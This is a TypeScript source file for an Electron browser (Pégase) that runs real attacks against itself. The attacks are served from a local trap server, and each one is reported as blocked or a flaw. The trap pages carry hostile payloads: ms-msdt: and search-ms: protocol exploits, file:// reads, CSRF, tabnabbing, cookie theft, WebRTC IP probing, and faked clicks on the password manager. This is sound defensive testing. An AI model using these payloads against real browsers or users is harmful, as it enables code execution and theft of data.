// Le contrôle de sécurité de Pégase : de VRAIES attaques, lancées contre Pégase lui-même, sur des pages pièges servies
// par un petit serveur local (127.0.0.1 et localhost = deux sites différents), dans un profil jetable qui a exactement
// les protections d'un profil normal. Chaque attaque rend « bloqué », « FAILLE » ou « non essayé » (avec la raison).
// Rien ne sort de ce PC. Les résultats s'affichent dans Réglages → Sécurité (et le banc test/securite/ les vérifie).
import { app, BaseWindow, type WebContents } from 'electron';
import http from 'node:http';
import { mkdtempSync, rmSync, readdirSync, readFileSync, readlinkSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir, networkInterfaces } from 'node:os';
import { ProfilOuvert } from './profil';
import { hoteAffiche, refus, siteDe } from './securite';
import { versAdresse, nouvelId } from './outils';
import { MotsDePasse, origineSure } from './motsdepasse';
import type { Protection } from './protection';

export interface Essai { nom: string; resultat: 'bloqué' | 'FAILLE' | 'non essayé'; detail?: string }
export interface Groupe { id: string; nom: string; detail: string; essais: Essai[] }
export interface Rapport { date: number; version: string; chromium: string; electron: string; groupes: Groupe[] }

const EICAR = Buffer.from(['X5O!P%@AP[4\\PZX54(P^)7CC)7}$', 'EICAR-STANDARD-ANTIVIRUS-', 'TEST-FILE!$H+H*'].join(''));
const pause = (ms: number) => new Promise((r) => setTimeout(r, ms));
const ESSAI = !app.isPackaged && !!process.env.PEGASE_ESSAI;

/** Le serveur piège : pages d'attaque, et ce que les pages lui rapportent. */
async function serveurPiege() {
  const resultats = new Map<string, any>(); const vus: { url: string; cookie?: string; hote?: string; methode: string }[] = [];
  const attentes = new Map<string, (v: any) => void>();
  const rapporte = `async function rapporte(k, v) { await fetch('/r?k=' + k, { method: 'POST', body: JSON.stringify(v) }).catch(() => 0); }`;
  const pages: Record<string, string> = {
    '/moteur': `<script>${rapporte}
      rapporte('moteur', { require: typeof require, process: typeof process, module: typeof module, pegase: typeof window.pegase, electron: typeof window.electron, ipc: typeof window.ipcRenderer, interne: typeof window.__pegase });</script>`,
    '/fichier': `<script>${rapporte}
      fetch('file:///etc/hosts').then(r => r.text()).then(t => rapporte('fichier', { lu: t.length })).catch(e => rapporte('fichier', { lu: -1 }));</script>`,
    '/aller-fichier': `<script>setTimeout(() => { location.href = 'file:///etc/hosts'; }, 50);</script>`,
    '/aller-interne': `<script>setTimeout(() => { location.href = 'pegase://app/index.html'; }, 50);</script>`,
    '/cadre-interne': `<iframe id="f" src="pegase://app/index.html"></iframe>`,
    '/popup-interne': `<script>${rapporte} const w = window.open('pegase://app/index.html'); rapporte('popup-interne', { w: !!w });</script>`,
    '/httponly': `<script>${rapporte} rapporte('httponly', { cookie: document.cookie });</script>`,
    '/tiers': `<img src="http://localhost:PORT/pixel" alt=""><script>${rapporte} setTimeout(() => rapporte('tiers', {}), 400);</script>`,
    '/csrf': `<form id="f" method="POST" action="http://localhost:PORT/virement"><input name="montant" value="1000"></form><script>document.getElementById('f').submit();</script>`,
    '/tabnab': `<a id="l" href="http://localhost:PORT/tabnab-cible" target="_blank">lien</a>`,
    '/lecture-croisee': `<script>${rapporte} fetch('http://localhost:PORT/secret', { credentials: 'include' }).then(r => r.text()).then(t => rapporte('croise', { lu: t })).catch(() => rapporte('croise', { lu: null }));</script>`,
    '/ouvrir': `<script>${rapporte} window.addEventListener('message', () => {}); window.essai = () => { const w = window.open('http://localhost:PORT/vide'); rapporte('noopener', { w: w === null ? 'null' : typeof w }); };</script>`,
    '/pluie': `<script>${rapporte} let n = 0; for (let i = 0; i < 25; i++) { try { if (window.open('http://localhost:PORT/vide?' + i)) n++; } catch {} } rapporte('pluie', { n });</script>`,
    '/permissions': `<script>${rapporte} (async () => {
        const r = []; for (let i = 0; i < 6; i++) r.push(await Notification.requestPermission().catch(() => 'erreur'));
        const g = await new Promise((ok) => navigator.geolocation.getCurrentPosition(() => ok('donnée'), (e) => ok('refusée ' + e.code), { timeout: 3000 }));
        rapporte('permissions', { notif: r, geo: g });
      })();</script>`,
    '/protocole': `<script>setTimeout(() => { location.href = 'ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=?"'; }, 50); setTimeout(() => { location.href = 'search-ms:query=facture&crumb=location:\\\\\\\\piege.exemple\\\\partage'; }, 300);</script>`,
    '/webrtc': `<script>${rapporte} (async () => {
        const c = []; const pc = new RTCPeerConnection({ iceServers: [] }); pc.createDataChannel('x');
        pc.onicecandidate = (e) => { if (e.candidate) c.push(e.candidate.candidate); };
        await pc.setLocalDescription(await pc.createOffer());
        setTimeout(() => rapporte('webrtc', { c, sdp: pc.localDescription ? pc.localDescription.sdp : '' }), 2500);
      })();</script>`,
    '/connexion': `<form action="/connecte" method="POST"><input name="email" autocomplete="username"><input type="password" id="p" name="motdepasse"></form>`,
    '/cadre-connexion': `<h1>Page piège</h1><iframe src="http://localhost:PORT/connexion" width="400" height="200"></iframe>`,
    '/faux-clic': `<form><input name="email" autocomplete="username"><input type="password" id="p"></form><script>${rapporte}
      setTimeout(() => { const p = document.getElementById('p'); p.focus();
        setTimeout(() => { const h = document.querySelector('pegase-cle'); const ombre = h ? h.shadowRoot : null;
          if (h) { h.click(); h.dispatchEvent(new MouseEvent('click', { bubbles: true, composed: true })); }
          setTimeout(() => rapporte('faux-clic', { hote: !!h, ombre: ombre === null ? 'null' : 'visible', valeur: p.value.length }), 800);
        }, 600); }, 300);</script>`,
  };
  const s = http.createServer((q, r) => {
    const u = new URL(q.url ?? '/', 'http://x'); vus.push({ url: u.pathname, cookie: q.headers.cookie, hote: q.headers.host, methode: q.method ?? 'GET' });
    if (u.pathname === '/r') { let b = ''; q.on('data', (d) => { b += d; }); q.on('end', () => { const k = u.searchParams.get('k') ?? ''; let v: any = null; try { v = JSON.parse(b); } catch { /* */ } resultats.set(k, v); attentes.get(k)?.(v); r.writeHead(204, { 'access-control-allow-origin': '*' }); r.end(); }); return; }
    const port = (s.address() as any).port;
    if (u.pathname === '/httponly') r.setHeader('set-cookie', ['jeton=secret-de-session; HttpOnly; Path=/; SameSite=Lax', 'visible=1; Path=/']);
    if (u.pathname === '/pose-cookie') { r.writeHead(200, { 'set-cookie': 'banque=session-banque; Path=/', 'content-type': 'text/html' }); r.end('<p>banque</p>'); return; }
    if (u.pathname === '/pixel' || u.pathname === '/secret' || u.pathname === '/virement' || u.pathname === '/vide') { r.writeHead(200, { 'content-type': 'text/plain', ...(u.pathname === '/pixel' ? { 'set-cookie': 'pisteur=1; Path=/' } : {}) }); r.end(u.pathname === '/secret' ? 'SECRET' : 'ok'); return; }
    if (u.pathname === '/tabnab-cible') { r.writeHead(200, { 'content-type': 'text/html' }); r.end(`<script>${rapporte} rapporte('tabnab', { opener: window.opener === null ? 'null' : typeof window.opener }); try { if (window.opener) window.opener.location = 'http://localhost:${port}/hameconnage'; } catch (e) {}</script>`); return; }
    if (u.pathname === '/telecharge/eicar') { r.writeHead(200, { 'content-type': 'application/octet-stream', 'content-disposition': 'attachment; filename="eicar.com"' }); r.end(EICAR); return; }
    if (u.pathname === '/telecharge/facture') { r.writeHead(200, { 'content-type': 'application/octet-stream', 'content-disposition': 'attachment; filename="facture.pdf.exe"' }); r.end('MZ faux programme'); return; }
    if (u.pathname === '/telecharge/note') { r.writeHead(200, { 'content-type': 'text/plain', 'content-disposition': 'attachment; filename="note.txt"' }); r.end('une note'); return; }
    const p = pages[u.pathname];
    if (p) { r.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }); r.end(`<!doctype html><meta charset="utf-8"><title>Piège</title>${p.replaceAll('PORT', String(port))}`); return; }
    r.writeHead(404); r.end();
  });
  await new Promise<void>((ok) => s.listen(0, '127.0.0.1', ok));
  const port = (s.address() as any).port;
  return {
    port, a: `http://127.0.0.1:${port}`, b: `http://localhost:${port}`, vus, resultats,
    attendre: (k: string, ms = 6000) => (resultats.has(k) ? Promise.resolve(resultats.get(k)) : new Promise<any>((ok) => { attentes.set(k, ok); setTimeout(() => ok(undefined), ms); })),
    fermer: () => new Promise<void>((ok) => { s.closeAllConnections?.(); s.close(() => ok()); }),
  };
}

/** Lance tout le contrôle. `protection` : celle de Pégase (bloqueur, quarantaine) ; `mdps` : où ranger le coffre de l'essai. */
export async function controler(protection: Protection, enregistrerMdp: (p: ProfilOuvert, m: MotsDePasse | null) => void): Promise<Rapport> {
  const dossier = mkdtempSync(join(tmpdir(), 'pegase-controle-'));
  const piege = await serveurPiege();
  const fenetre = new BaseWindow({ show: false, width: 900, height: 700 });
  const p = new ProfilOuvert({ id: `controle-${nouvelId()}`, dossier: join(dossier, 'profil'), appareil: 'controle', prive: true, fond: true, telechargements: join(dossier, 'telechargements'),
    avantSession: (s) => { (s as any).__controle = true; }, preparerSession: (s, pr) => protection.preparerSession(s, pr) });
  const mdp = new MotsDePasse(p); enregistrerMdp(p, mdp);
  const espace = p.espaces()[0].id;
  const ouverts: string[] = [];
  // Un lien ouvert par la page (après un vrai geste) devient un onglet, comme dans une fenêtre normale.
  p.on('ouvrir', (o: { url: string }) => { const n = p.creerOnglet(o.url, espace); ouverts.push(n.id); const v = p.reveiller(n.id); fenetre.contentView.addChildView(v.vue!); v.vue!.setBounds({ x: 0, y: 0, width: 880, height: 680 }); });
  /** Ouvre une page piège dans un vrai onglet (mêmes protections qu'un onglet normal). */
  const ouvrir = async (url: string, attente = 1500): Promise<WebContents> => {
    const o = p.creerOnglet(url, espace); ouverts.push(o.id);
    const v = p.reveiller(o.id); const vue = v.vue!;
    fenetre.contentView.addChildView(vue); vue.setBounds({ x: 0, y: 0, width: 880, height: 680 });
    await Promise.race([new Promise<void>((ok) => { vue.webContents.once('did-finish-load', () => ok()); }), pause(5000)]);
    await pause(attente);
    return vue.webContents;
  };
  /** Un vrai geste de la personne (clic) dans la page : il passe par le processus principal, comme un clic à la souris. */
  const clic = (wc: WebContents) => { wc.sendInputEvent({ type: 'mouseDown', x: 5, y: 5, button: 'left', clickCount: 1 }); wc.sendInputEvent({ type: 'mouseUp', x: 5, y: 5, button: 'left', clickCount: 1 }); };
  const nbOnglets = () => p.ongletsRanges().length;
  const essai = async (nom: string, f: () => Promise<Essai['resultat'] | [Essai['resultat'], string]>): Promise<Essai> => {
    try { const r = await f(); return Array.isArray(r) ? { nom, resultat: r[0], detail: r[1] } : { nom, resultat: r }; }
    catch (e) { return { nom, resultat: 'non essayé', detail: `l’essai n’a pas pu se faire : ${String((e as Error).message ?? e).slice(0, 120)}` }; }
  };
  const ok = (cond: boolean, detail = ''): [Essai['resultat'], string] => [cond ? 'bloqué' : 'FAILLE', detail];
  const groupes: Groupe[] = [];
  try {
    await protection.pret(p);
    // ————— 1. Une page essaie d'atteindre Pégase ou ton PC —————
    const g1: Essai[] = [];
    g1.push(await essai('Accès au moteur interne (require, process, module)', async () => { await ouvrir(`${piege.a}/moteur`); const r = await piege.attendre('moteur'); return ok(!!r && r.require === 'undefined' && r.process === 'undefined' && r.module === 'undefined', r ? `require : ${r.require}, process : ${r.process}` : 'pas de réponse'); }));
    g1.push(await essai('Accès à Pégase depuis la page (preload, ipc)', async () => { const r = piege.resultats.get('moteur'); return ok(!!r && r.pegase === 'undefined' && r.electron === 'undefined' && r.ipc === 'undefined' && r.interne === 'undefined', r ? `window.pegase : ${r.pegase}, ipcRenderer : ${r.ipc}` : ''); }));
    g1.push(await essai('Lire un fichier du PC (fetch file://)', async () => { await ouvrir(`${piege.a}/fichier`); const r = await piege.attendre('fichier'); return ok(!!r && r.lu === -1, r?.lu === -1 ? 'refusé par Chromium' : `lu ${r?.lu} caractères`); }));
    g1.push(await essai('Aller sur file:// depuis la page', async () => { const wc = await ouvrir(`${piege.a}/aller-fichier`, 1200); return ok(!wc.getURL().startsWith('file:'), wc.getURL()); }));
    g1.push(await essai('Aller sur l’interface de Pégase (pegase://)', async () => { const wc = await ouvrir(`${piege.a}/aller-interne`, 1200); return ok(!wc.getURL().startsWith('pegase:'), wc.getURL()); }));
    g1.push(await essai('L’interface de Pégase dans un cadre caché', async () => { const wc = await ouvrir(`${piege.a}/cadre-interne`, 1200); const charge = wc.mainFrame.frames.some((f) => f.url.startsWith('pegase://app')); return ok(!charge, charge ? 'le cadre a chargé l’interface' : 'cadre refusé'); }));
    g1.push(await essai('Fenêtre vers pegase:// sans clic', async () => { const n = nbOnglets(); await ouvrir(`${piege.a}/popup-interne`, 800); return ok(nbOnglets() === n + 1, 'aucune fenêtre ouverte'); }));
    groupes.push({ id: 'moteur', nom: 'Une page essaie d’atteindre Pégase ou ton PC', detail: 'XSS, accès au moteur interne, require, fichiers', essais: g1 });

    // ————— 2. Fausse adresse dans la barre —————
    const g2: Essai[] = [];
    g2.push(await essai('Lettres sosies (аpple.com en cyrillique)', async () => { const h = hoteAffiche(new URL('https://аpple.com/').hostname); return ok(h.startsWith('xn--'), `montré : ${h}`); }));
    g2.push(await essai('Alphabets mélangés (pаypal.com)', async () => { const h = hoteAffiche(new URL('https://pаypal.com/').hostname); return ok(h.startsWith('xn--'), `montré : ${h}`); }));
    g2.push(await essai('Long sous-domaine (paypal.com.connexion.piege.fr)', async () => { const s = siteDe('https://paypal.com.connexion-securisee.verification.piege-exemple.fr/'); return ok(s === 'piege-exemple.fr', `domaine toujours montré en entier : ${s}`); }));
    g2.push(await essai('Texte à l’envers (U+202E) dans l’adresse', async () => { const h = hoteAffiche('exemple.fr‮exe.gpj'); return ok(!/[‪-‮⁦-⁩]/.test(h), 'caractères d’inversion retirés'); }));
    g2.push(await essai('javascript: et data: tapés dans la barre', async () => { const a = versAdresse('javascript:alert(document.cookie)', 'duckduckgo'), b = versAdresse('data:text/html,<script>alert(1)</script>', 'duckduckgo'); return ok(!/^(javascript|data):/i.test(a) && !/^(javascript|data):/i.test(b), 'cherchés comme du texte, jamais exécutés'); }));
    groupes.push({ id: 'adresse', nom: 'Fausse adresse dans la barre', detail: 'Sosies, longs sous-domaines, texte à l’envers', essais: g2 });

    // ————— 3. Vol de session ou de cookies —————
    const g3: Essai[] = [];
    g3.push(await essai('Lire un cookie HttpOnly depuis la page', async () => { await ouvrir(`${piege.a}/httponly`); const r = await piege.attendre('httponly'); return ok(!!r && !String(r.cookie).includes('secret-de-session') && String(r.cookie).includes('visible=1'), `document.cookie : « ${r?.cookie ?? ''} »`); }));
    g3.push(await essai('Cookies tiers (pisteur d’un autre site)', async () => {
      await ouvrir(`${piege.b}/pose-cookie`, 300); await ouvrir(`${piege.a}/tiers`); await piege.attendre('tiers');
      const l = piege.vus.filter((x) => x.url === '/pixel'); const envoye = l.some((x) => /banque|pisteur/.test(x.cookie ?? ''));
      const pose = (await p.session.cookies.get({ name: 'pisteur' })).length > 0;
      return ok(!envoye && !pose, `${envoye ? 'cookie envoyé' : 'aucun cookie envoyé'}, ${pose ? 'cookie du pisteur gardé' : 'cookie du pisteur refusé'}`);
    }));
    g3.push(await essai('CSRF : formulaire piégé vers un autre site', async () => { await ouvrir(`${piege.a}/csrf`, 1200); const v = piege.vus.filter((x) => x.url === '/virement' && x.methode === 'POST'); return ok(!v.some((x) => /banque=/.test(x.cookie ?? '')), v.length ? 'envoyé sans le cookie de session' : 'pas envoyé'); }));
    g3.push(await essai('Onglet détourné (tabnabbing, window.opener)', async () => {
      const wc = await ouvrir(`${piege.a}/tabnab`, 300); clic(wc); await wc.executeJavaScript('document.getElementById("l").click()', true);
      const r = await piege.attendre('tabnab', 4000); await pause(500);
      if (!r) return ['non essayé', 'l’onglet du lien ne s’est pas ouvert'];
      return ok(r.opener === 'null' && !wc.getURL().includes('hameconnage'), `window.opener : ${r.opener}`);
    }));
    g3.push(await essai('Lire les données d’un autre site (fetch avec cookies)', async () => { await ouvrir(`${piege.a}/lecture-croisee`); const r = await piege.attendre('croise'); return ok(!!r && r.lu === null, r?.lu === null ? 'refusé (même origine)' : `lu : ${r?.lu}`); }));
    g3.push(await essai('Fenêtre ouverte avec un lien vers la page (noopener)', async () => { const wc = await ouvrir(`${piege.a}/ouvrir`, 300); clic(wc); await wc.executeJavaScript('window.essai()', true); const r = await piege.attendre('noopener'); return ok(r?.w === 'null', `window.open rend : ${r?.w}`); }));
    groupes.push({ id: 'session', nom: 'Vol de session ou de cookies', detail: 'HttpOnly, cookies tiers, CSRF, onglet détourné', essais: g3 });

    // ————— 4. Vol de mot de passe enregistré —————
    const g4: Essai[] = [];
    mdp.enregistrer(piege.a, 'awa@exemple.yt', 'Un-mot-de-passe-de-controle-42');
    g4.push(await essai('Faux formulaire caché dans un cadre d’un autre site', async () => {
      const wc = await ouvrir(`${piege.a}/cadre-connexion`, 1000); const cadre = wc.mainFrame.frames[0];
      if (!cadre) return ['non essayé', 'le cadre ne s’est pas chargé'];
      const o = origineSure(cadre), haut = origineSure(wc.mainFrame);
      return ok(o === null && haut === piege.a, 'le cadre n’a droit à rien ; seule la page principale du site exact peut être remplie');
    }));
    g4.push(await essai('Site sosie (même page, autre nom)', async () => { const wc = await ouvrir(`${piege.b}/connexion`, 600); const o = origineSure(wc.mainFrame); return ok(!!o && mdp.pour(o).length === 0 && mdp.pour(piege.a).length === 1, `rien de proposé sur ${o}`); }));
    g4.push(await essai('Clic simulé par la page sur la clé', async () => { await ouvrir(`${piege.a}/faux-clic`, 300); const r = await piege.attendre('faux-clic', 5000); if (!r) return ['non essayé', 'pas de réponse']; return ok(r.ombre === 'null' && r.valeur === 0, `clé ${r.hote ? 'présente' : 'absente'}, intérieur ${r.ombre === 'null' ? 'invisible pour la page' : 'visible'}, champ ${r.valeur ? 'rempli' : 'vide'}`); }));
    groupes.push({ id: 'mdp', nom: 'Vol de mot de passe enregistré', detail: 'Faux formulaire caché, site sosie', essais: g4 });

    // ————— 5. Téléchargement piégé —————
    const g5: Essai[] = [];
    const dl = async (chemin: string, nom: string) => {
      const avant = [...protection.dls.values()].filter((t) => t.profil === p.id).length;
      const wc = await ouvrir(`${piege.a}/vide`, 100); wc.downloadURL(`${piege.a}${chemin}`);
      for (let i = 0; i < 60; i++) { const l = [...protection.dls.values()].filter((t) => t.profil === p.id && t.nom === nom); const t = l.at(-1); if (l.length && [...protection.dls.values()].filter((x) => x.profil === p.id).length > avant && t && ['sain', 'bloque', 'erreur', 'annule'].includes(t.etat)) return t; await pause(200); }
      return null;
    };
    const dossierDl = join(dossier, 'telechargements');
    const arrives = () => (existsSync(dossierDl) ? readdirSync(dossierDl) : []);
    g5.push(await essai('Double extension (facture.pdf.exe)', async () => { const t = await dl('/telecharge/facture', 'facture.pdf.exe'); if (!t) return ['non essayé', 'téléchargement pas terminé']; return ok(t.etat === 'bloque' && !arrives().includes('facture.pdf.exe'), t.detail); }));
    g5.push(await essai('Fichier d’essai antivirus EICAR', async () => { const t = await dl('/telecharge/eicar', 'eicar.com'); if (!t) return ['non essayé', 'téléchargement pas terminé']; return ok(t.etat === 'bloque' && !arrives().includes('eicar.com'), t.detail); }));
    g5.push(await essai('Ouverture automatique après téléchargement', async () => { const o = protection.ouvertures; const t = await dl('/telecharge/note', 'note.txt'); if (!t) return ['non essayé', 'téléchargement pas terminé']; await pause(500); return ok(t.etat === 'sain' && arrives().includes('note.txt') && protection.ouvertures === o, 'enregistré après analyse, jamais ouvert tout seul'); }));
    groupes.push({ id: 'telechargement', nom: 'Téléchargement piégé', detail: 'Double extension, EICAR, ouverture automatique', essais: g5 });

    // ————— 6. Fuite de ton adresse IP —————
    const g6: Essai[] = [];
    g6.push(await essai('Adresse IP locale par WebRTC', async () => {
      await ouvrir(`${piege.a}/webrtc`, 200); const r = await piege.attendre('webrtc', 6000); if (!r) return ['non essayé', 'pas de réponse'];
      const locales = Object.values(networkInterfaces()).flat().filter((i) => i && !i.internal).map((i) => i!.address);
      const fuite = locales.filter((a) => JSON.stringify(r).includes(a));
      return ok(!fuite.length, fuite.length ? `adresse vue : ${fuite.join(', ')}` : `${r.c.length} candidat(s), aucune adresse locale`);
    }));
    g6.push(await essai('Adresses des sites demandées hors du DNS chiffré', async () => {
      const d = (protection as any).dns as { nom: string; chiffre: boolean };
      if (d.chiffre) return ['bloqué', `DNS chiffré : ${d.nom}`];
      return ['non essayé', `le DNS chiffré ne répond pas ici : Pégase utilise celui du système (${d.nom}) pour ne pas couper Internet`];
    }));
    groupes.push({ id: 'ip', nom: 'Fuite de ton adresse IP', detail: 'WebRTC, DNS hors de Sphinx', essais: g6 });

    // ————— 7. Pluie de fenêtres et d'alertes —————
    const g7: Essai[] = [];
    g7.push(await essai('Pluie de fenêtres surgissantes (25 d’un coup)', async () => { const n = nbOnglets(); await ouvrir(`${piege.a}/pluie`, 800); const r = await piege.attendre('pluie'); return ok(nbOnglets() === n + 1 && (r?.n ?? 0) === 0, `${nbOnglets() - n - 1} fenêtre(s) ouverte(s)`); }));
    g7.push(await essai('Notifications et position sans ton accord', async () => { const avant = refus.permissions; await ouvrir(`${piege.a}/permissions`, 200); const r = await piege.attendre('permissions', 8000); if (!r) return ['non essayé', 'pas de réponse']; return ok(!r.notif.includes('granted') && String(r.geo).startsWith('refusée') && refus.permissions > avant, `notifications : ${[...new Set(r.notif)].join(', ')} ; position : ${r.geo}`); }));
    g7.push(await essai('Lien vers un programme dangereux (ms-msdt:, search-ms:)', async () => { const avant = refus.protocoles; await ouvrir(`${piege.a}/protocole`, 1200); return ok(refus.protocoles >= avant + 1, `${refus.protocoles - avant} lien(s) refusé(s) sans rien ouvrir`); }));
    groupes.push({ id: 'pluie', nom: 'Pluie de fenêtres et d’alertes', detail: 'Popups, notifications, permissions, programmes', essais: g7 });

    // ————— 8. Port de débogage —————
    const g8: Essai[] = [];
    g8.push(await essai('Port de débogage distant ouvert', async () => {
      if (!app.isPackaged && ESSAI) return ['non essayé', 'lancé par l’outil d’essai (Playwright), qui ouvre lui-même ce port : vérifié sur l’installateur'];
      if (app.commandLine.hasSwitch('remote-debugging-port') || app.commandLine.hasSwitch('remote-debugging-pipe')) return ['FAILLE', 'Pégase a été lancé avec un port de débogage'];
      const ports = portsEcoutes(piege.port);
      if (ports === null) return ['bloqué', 'aucune option de débogage au lancement'];
      return ok(!ports.length, ports.length ? `ports ouverts : ${ports.join(', ')}` : 'aucun port ouvert par Pégase');
    }));
    groupes.push({ id: 'debogage', nom: 'Accès à distance à Pégase', detail: 'Port de débogage, inspecteur à distance', essais: g8 });
  } finally {
    for (const id of ouverts) { try { p.endormir(id); } catch { /* */ } }
    enregistrerMdp(p, null);
    for (const [id, t] of protection.dls) if (t.profil === p.id) { rmSync(join(protection.quarantaine, id), { recursive: true, force: true }); protection.dls.delete(id); }
    try { fenetre.destroy(); } catch { /* */ }
    p.fermer(); await p.session.clearData().catch(() => 0);
    await piege.fermer();
    rmSync(dossier, { recursive: true, force: true });
  }
  return { date: Date.now(), version: app.getVersion(), chromium: process.versions.chrome, electron: process.versions.electron, groupes };
}

/** Les ports TCP en écoute ouverts par les processus de Pégase (Linux : /proc) ; null si on ne peut pas le savoir. */
function portsEcoutes(sauf: number): number[] | null {
  if (process.platform !== 'linux') return null;
  try {
    const ecoute = new Map<string, number>();
    for (const f of ['/proc/net/tcp', '/proc/net/tcp6']) {
      if (!existsSync(f)) continue;
      for (const l of readFileSync(f, 'utf8').split('\n').slice(1)) { const c = l.trim().split(/\s+/); if (c[3] === '0A') ecoute.set(c[9], parseInt(c[1].split(':').pop()!, 16)); }
    }
    const ports = new Set<number>();
    for (const m of app.getAppMetrics()) {
      const d = `/proc/${m.pid}/fd`; if (!existsSync(d)) continue;
      for (const fd of readdirSync(d)) { try { const x = /socket:\[(\d+)\]/.exec(readlinkSync(join(d, fd))); if (x && ecoute.has(x[1])) ports.add(ecoute.get(x[1])!); } catch { /* */ } }
    }
    ports.delete(sauf);
    return [...ports];
  } catch { return null; }
}
